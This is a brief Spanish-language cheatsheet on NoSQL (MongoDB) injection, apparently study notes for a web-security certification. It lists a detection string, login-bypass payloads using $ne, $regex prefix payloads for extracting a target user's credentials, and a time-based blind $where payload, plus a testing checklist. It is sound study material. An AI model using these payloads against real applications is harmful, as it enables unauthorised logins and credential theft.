---
tipo: cheatsheet
vuln: nosqli
tags: [bscp, tipo/cheatsheet, vuln/nosqli]
relacionada: "[[NoSQL-Injection]]"
---

# CS · NoSQL Injection

## Flujo repetible
1. Inyecta sintaxis Mongo en {{PARAM}}.
2. Prueba operadores para bypass o extracción ciega.

## Detección
```
admin' || '1'=='1                   (¿cambia la respuesta? => inyectable)
```

## Plantillas de payload
```
admin' || '1'=='1
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":{"$regex":"^{{TARGET_USER}}"}}
'||sleep(5000)||'                   ($where, ciega)
```

## Escalada al objetivo
Bypass de login como {{TARGET_USER}} o extracción ciega de credenciales → admin.

## Checklist
- [ ] Probé operadores $ne/$regex
- [ ] Probé bypass de login
- [ ] Probé inyección ciega

## Referencias
- https://portswigger.net/web-security/nosql-injection
